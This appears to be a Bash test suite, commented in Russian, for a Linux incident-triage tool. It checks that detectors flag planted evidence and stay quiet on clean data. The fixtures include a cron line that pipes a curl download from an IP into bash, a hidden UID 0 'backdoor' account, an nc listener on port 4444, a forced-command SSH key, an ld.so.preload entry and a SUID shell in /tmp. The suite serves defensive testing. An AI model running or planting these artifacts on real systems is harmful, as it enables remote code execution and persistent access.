#!/usr/bin/env bash
# ============================================================================
#  Тесты Linux Incident Triage.
#
#  Как тестировать скрипт реагирования, не имея скомпрометированной машины:
#  проверки читают собранные артефакты из каталога, а системные файлы — через
#  подменяемые переменные. Значит, можно подсунуть каталог с заготовленными
#  «уликами» и убедиться, что каждая проверка срабатывает именно на них и
#  молчит на чистых данных.
#
#  Вторая половина тестов — контрпримеры. Проверка, которая срабатывает на
#  чём угодно, бесполезна: она создаёт шум и приучает игнорировать отчёт.
#
#  Запуск:  bash tests/run_tests.sh
# ============================================================================

set -uo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

if [[ -t 1 ]]; then
    T_RED=$'\033[31m'; T_GREEN=$'\033[32m'; T_RESET=$'\033[0m'; T_BOLD=$'\033[1m'
else
    T_RED=""; T_GREEN=""; T_RESET=""; T_BOLD=""
fi

# --- каркас -----------------------------------------------------------------

pass() {
    TESTS_RUN=$((TESTS_RUN + 1)); TESTS_PASSED=$((TESTS_PASSED + 1))
    printf '  %sПРОЙДЕН%s  %s\n' "$T_GREEN" "$T_RESET" "$1"
}

fail() {
    TESTS_RUN=$((TESTS_RUN + 1)); TESTS_FAILED=$((TESTS_FAILED + 1))
    printf '  %sПРОВАЛЕН%s %s\n' "$T_RED" "$T_RESET" "$1"
    [[ -n "${2:-}" ]] && printf '           %s\n' "$2"
}

assert_finding() {
    local pattern="$1" description="$2"
    if grep -q "$pattern" "$FINDINGS_FILE" 2>/dev/null; then
        pass "$description"
    else
        fail "$description" "ожидалась находка по шаблону: ${pattern}"
    fi
}

assert_no_finding() {
    local pattern="$1" description="$2"
    if grep -q "$pattern" "$FINDINGS_FILE" 2>/dev/null; then
        fail "$description" "находка появилась, хотя не должна была"
    else
        pass "$description"
    fi
}

assert_equals() {
    if [[ "$1" == "$2" ]]; then
        pass "$3"
    else
        fail "$3" "ожидалось «$2», получено «$1»"
    fi
}

assert_file_exists() {
    if [[ -f "$1" ]]; then
        pass "$2"
    else
        fail "$2" "файл не создан: $1"
    fi
}

# Готовит чистое окружение для одной проверки.
setup_case() {
    OUTPUT_DIR="$(mktemp -d)"
    FINDINGS_FILE="${OUTPUT_DIR}/.findings.jsonl"
    TRIAGE_LOG="${OUTPUT_DIR}/test.log"
    : > "$FINDINGS_FILE"
    : > "$TRIAGE_LOG"
    PASSWD_FILE="${OUTPUT_DIR}/passwd"
    SHADOW_FILE="${OUTPUT_DIR}/shadow"
    LD_PRELOAD_FILE="${OUTPUT_DIR}/ld.so.preload"
    export OUTPUT_DIR FINDINGS_FILE TRIAGE_LOG PASSWD_FILE SHADOW_FILE LD_PRELOAD_FILE
}

teardown_case() {
    [[ -n "${OUTPUT_DIR:-}" && "$OUTPUT_DIR" == /tmp/* ]] && rm -rf "$OUTPUT_DIR"
}

# --- подключение проверяемого кода -----------------------------------------
QUIET=1
export QUIET
# shellcheck source=/dev/null
source "${PROJECT_DIR}/lib/common.sh"
# shellcheck source=/dev/null
source "${PROJECT_DIR}/lib/analyze.sh"

printf '\n%sТЕСТЫ Linux Incident Triage%s\n' "$T_BOLD" "$T_RESET"
printf '=====================================================================\n\n'

# ============================================================================
printf 'Утилиты\n'
# ============================================================================

setup_case
assert_equals "$(json_escape 'обычный текст')" 'обычный текст' \
    'json_escape не портит обычный текст'
assert_equals "$(json_escape 'кавычка " внутри')" 'кавычка \" внутри' \
    'json_escape экранирует кавычки'
assert_equals "$(json_escape 'слеш \ внутри')" 'слеш \\ внутри' \
    'json_escape экранирует обратный слеш'

add_finding "high" "test" "Тест" "Описание с \"кавычками\"" "улика"
if python3 -c "
import json,sys
line = open('$FINDINGS_FILE',encoding='utf-8').readline()
json.loads(line)
" 2>/dev/null; then
    pass 'add_finding порождает корректный JSON'
else
    fail 'add_finding порождает корректный JSON'
fi
teardown_case

# ============================================================================
printf '\nПроверка: учётные записи с UID 0\n'
# ============================================================================

setup_case
cat > "$PASSWD_FILE" <<'EOF'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
backdoor:x:0:0:system:/root:/bin/bash
alice:x:1000:1000:Alice:/home/alice:/bin/bash
EOF
check_uid0_accounts
assert_finding 'backdoor' 'обнаружена скрытая учётная запись с UID 0'
assert_no_finding '"title":"Учётная запись «root»' 'штатный root не считается находкой'
teardown_case

setup_case
cat > "$PASSWD_FILE" <<'EOF'
root:x:0:0:root:/root:/bin/bash
alice:x:1000:1000:Alice:/home/alice:/bin/bash
EOF
check_uid0_accounts
assert_equals "$(count_findings)" "0" 'на чистом passwd находок нет'
teardown_case

# ============================================================================
printf '\nПроверка: подозрительные учётные записи\n'
# ============================================================================

setup_case
cat > "$PASSWD_FILE" <<'EOF'
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
mysql:x:110:110:MySQL:/nonexistent:/usr/sbin/nologin
alice:x:1000:1000:Alice:/home/alice:/bin/bash
EOF
: > "$SHADOW_FILE"
check_suspicious_accounts
assert_finding 'www-data' 'служебная запись с оболочкой отмечена'
assert_no_finding 'mysql' 'служебная запись с nologin не отмечена'
assert_no_finding '"title":"Служебная запись «alice»' 'обычный пользователь с оболочкой — норма'
teardown_case

setup_case
cat > "$PASSWD_FILE" <<'EOF'
root:x:0:0:root:/root:/bin/bash
EOF
cat > "$SHADOW_FILE" <<'EOF'
root::19000:0:99999:7:::
alice:$6$hash:19000:0:99999:7:::
EOF
check_suspicious_accounts
assert_finding 'пустой пароль' 'пустой пароль обнаружен'
teardown_case

# ============================================================================
printf '\nПроверка: слушающие порты\n'
# ============================================================================

setup_case
cat > "${OUTPUT_DIR}/04_listening.txt" <<'EOF'
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*     users:(("sshd",pid=800,fd=3))
tcp   LISTEN 0      128          0.0.0.0:4444       0.0.0.0:*     users:(("nc",pid=1337,fd=3))
EOF
check_listening_ports
assert_finding '4444' 'нетипичный порт 4444 обнаружен'
assert_finding 'со всех интерфейсов' 'службы на 0.0.0.0 отмечены информационно'
teardown_case

setup_case
cat > "${OUTPUT_DIR}/04_listening.txt" <<'EOF'
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process
tcp   LISTEN 0      128        127.0.0.1:5432       0.0.0.0:*     users:(("postgres",pid=900,fd=5))
EOF
check_listening_ports
assert_equals "$(count_findings)" "0" 'штатная служба на localhost находок не даёт'
teardown_case

# ============================================================================
printf '\nПроверка: задания планировщика\n'
# ============================================================================

setup_case
cat > "${OUTPUT_DIR}/06_crontab_users.txt" <<'EOF'
### пользователь: www-data
*/5 * * * * curl -s http://198.51.100.50/x.sh | bash
EOF
: > "${OUTPUT_DIR}/06_crontab_system.txt"
check_cron_jobs
assert_finding 'загрузки и исполнения' 'задание «скачать и выполнить» обнаружено'
teardown_case

setup_case
cat > "${OUTPUT_DIR}/06_crontab_users.txt" <<'EOF'
### пользователь: root
0 3 * * * /usr/bin/certbot renew --quiet
30 2 * * 0 /usr/local/bin/backup.sh
EOF
: > "${OUTPUT_DIR}/06_crontab_system.txt"
check_cron_jobs
assert_equals "$(count_findings)" "0" 'штатные задания обслуживания находок не дают'
teardown_case

# ============================================================================
printf '\nПроверка: журнал аутентификации\n'
# ============================================================================

setup_case
{
    for i in $(seq 1 120); do
        printf 'Aug 18 10:%02d:%02d web01 sshd[%d]: Failed password for root from 192.0.2.66 port %d ssh2\n' \
            $((i % 60)) $((i % 60)) $((1000 + i)) $((40000 + i))
    done
    printf 'Aug 18 11:00:00 web01 sshd[2000]: Accepted password for root from 192.0.2.66 port 45000 ssh2\n'
} > "${OUTPUT_DIR}/09_auth_log.txt"
check_failed_logins
assert_finding 'Большое число неудачных входов' 'массовый перебор обнаружен'
assert_finding 'Успешный вход с адреса 192.0.2.66' 'успех после перебора обнаружен как критический'
assert_finding '"severity":"critical"' 'успеху после перебора присвоена критическая важность'
teardown_case

setup_case
cat > "${OUTPUT_DIR}/09_auth_log.txt" <<'EOF'
Aug 18 09:00:00 web01 sshd[100]: Accepted publickey for alice from 198.51.100.10 port 4000 ssh2
Aug 18 09:05:00 web01 sshd[101]: Failed password for bob from 198.51.100.11 port 4001 ssh2
Aug 18 09:05:20 web01 sshd[102]: Accepted password for bob from 198.51.100.11 port 4002 ssh2
EOF
check_failed_logins
assert_no_finding 'Большое число неудачных' 'одна ошибка пароля не считается перебором'
teardown_case

# ============================================================================
printf '\nПроверка: ключи SSH и конфигурация\n'
# ============================================================================

setup_case
cat > "${OUTPUT_DIR}/08_authorized_keys.txt" <<'EOF'
### /home/alice/.ssh/authorized_keys (пользователь alice)
ssh-rsa AAAAB3NzaC1yc2ETESTKEY alice@workstation
command="/bin/bash" ssh-rsa AAAAB3NzaC1yc2ESECOND attacker@host
EOF
cat > "${OUTPUT_DIR}/08_sshd_config.txt" <<'EOF'
PermitRootLogin yes
PasswordAuthentication yes
EOF
check_ssh_keys
assert_finding 'Ключей SSH' 'ключи перечислены'
assert_finding 'принудительной командой' 'ключ с command= обнаружен'
assert_finding 'вход под root' 'PermitRootLogin yes отмечен'
teardown_case

# ============================================================================
printf '\nПроверка: процессы и закрепление\n'
# ============================================================================

setup_case
cat > "${OUTPUT_DIR}/03_process_binaries.txt" <<'EOF'
PID      ПОЛЬЗОВАТЕЛЬ   ИСПОЛНЯЕМЫЙ ФАЙЛ
800      root           /usr/sbin/sshd
1337     www-data       /tmp/.hidden/payload (deleted)
EOF
check_processes
assert_finding 'удалённым исполняемым файлом' 'удалённый бинарник обнаружен'
assert_finding 'временных каталогов' 'запуск из /tmp обнаружен'
teardown_case

setup_case
printf '/tmp/.evil.so\n' > "$LD_PRELOAD_FILE"
check_persistence
assert_finding 'ld.so.preload' 'подмена загрузчика библиотек обнаружена'
assert_finding '"severity":"critical"' 'ld.so.preload отмечен как критический'
teardown_case

setup_case
cat > "${OUTPUT_DIR}/10_suid_sgid.txt" <<'EOF'
# Файлы с битами SUID/SGID
-rwsr-xr-x root:root     55000 /usr/bin/sudo
-rwsr-xr-x root:root     30000 /tmp/rootshell
EOF
check_persistence
assert_finding 'SUID-файл вне системных каталогов' 'SUID в /tmp обнаружен'
teardown_case

setup_case
cat > "${OUTPUT_DIR}/10_suid_sgid.txt" <<'EOF'
-rwsr-xr-x root:root     55000 /usr/bin/sudo
-rwsr-xr-x root:root     40000 /usr/bin/passwd
EOF
check_persistence
assert_no_finding 'SUID-файл вне системных' 'штатные SUID-файлы находок не дают'
teardown_case

# ============================================================================
printf '\nСквозной запуск скрипта\n'
# ============================================================================

RUN_DIR="$(mktemp -d)"
"${PROJECT_DIR}/triage.sh" -o "$RUN_DIR" --no-archive -q >/dev/null 2>&1
RUN_CODE=$?
RESULT_DIR="$(find "$RUN_DIR" -maxdepth 1 -type d -name 'triage_*' | head -1)"

if [[ -n "$RESULT_DIR" ]]; then
    pass 'скрипт создал каталог результатов с меткой времени'
else
    fail 'скрипт создал каталог результатов с меткой времени'
fi

assert_file_exists "${RESULT_DIR}/findings.json" 'создан машиночитаемый отчёт findings.json'
assert_file_exists "${RESULT_DIR}/SUMMARY.txt" 'создана человекочитаемая сводка'
assert_file_exists "${RESULT_DIR}/00_triage.log" 'создан журнал работы'
assert_file_exists "${RESULT_DIR}/01_system_info.txt" 'собрана информация о системе'
assert_file_exists "${RESULT_DIR}/07_passwd.txt" 'собраны учётные записи'
assert_file_exists "${RESULT_DIR}/MANIFEST.sha256" 'посчитаны контрольные суммы'

if python3 -c "import json; json.load(open('${RESULT_DIR}/findings.json', encoding='utf-8'))" 2>/dev/null; then
    pass 'findings.json является корректным JSON'
else
    fail 'findings.json является корректным JSON'
fi

if [[ "$RUN_CODE" =~ ^[0-2]$ ]]; then
    pass "код возврата осмысленный (${RUN_CODE})"
else
    fail "код возврата осмысленный" "получено ${RUN_CODE}"
fi

# Скрипт обязан работать только на чтение: временный файл-канарейка не должен
# измениться после прогона.
CANARY="$(mktemp)"
printf 'канарейка\n' > "$CANARY"
CANARY_BEFORE="$(sha256sum "$CANARY" | awk '{print $1}')"
"${PROJECT_DIR}/triage.sh" -o "$RUN_DIR" --no-archive -q >/dev/null 2>&1
CANARY_AFTER="$(sha256sum "$CANARY" | awk '{print $1}')"
assert_equals "$CANARY_AFTER" "$CANARY_BEFORE" 'скрипт не изменяет посторонние файлы'
rm -f "$CANARY"
rm -rf "$RUN_DIR"

# ============================================================================
printf '\nОбработка ошибок\n'
# ============================================================================

"${PROJECT_DIR}/triage.sh" --help >/dev/null 2>&1
assert_equals "$?" "0" '--help завершается кодом 0'

"${PROJECT_DIR}/triage.sh" --version >/dev/null 2>&1
assert_equals "$?" "0" '--version завершается кодом 0'

"${PROJECT_DIR}/triage.sh" --несуществующий-параметр >/dev/null 2>&1
assert_equals "$?" "3" 'неизвестный параметр даёт код 3'

"${PROJECT_DIR}/triage.sh" -o /такого/пути/нет >/dev/null 2>&1
assert_equals "$?" "3" 'несуществующий каталог вывода даёт код 3'

"${PROJECT_DIR}/triage.sh" -o >/dev/null 2>&1
assert_equals "$?" "3" 'параметр без значения даёт код 3'

# ============================================================================
printf '\n=====================================================================\n'
printf 'Всего: %d | %sпройдено: %d%s | %sпровалено: %d%s\n' \
    "$TESTS_RUN" "$T_GREEN" "$TESTS_PASSED" "$T_RESET" \
    "$T_RED" "$TESTS_FAILED" "$T_RESET"
printf '=====================================================================\n\n'

[[ "$TESTS_FAILED" -eq 0 ]] && exit 0 || exit 1
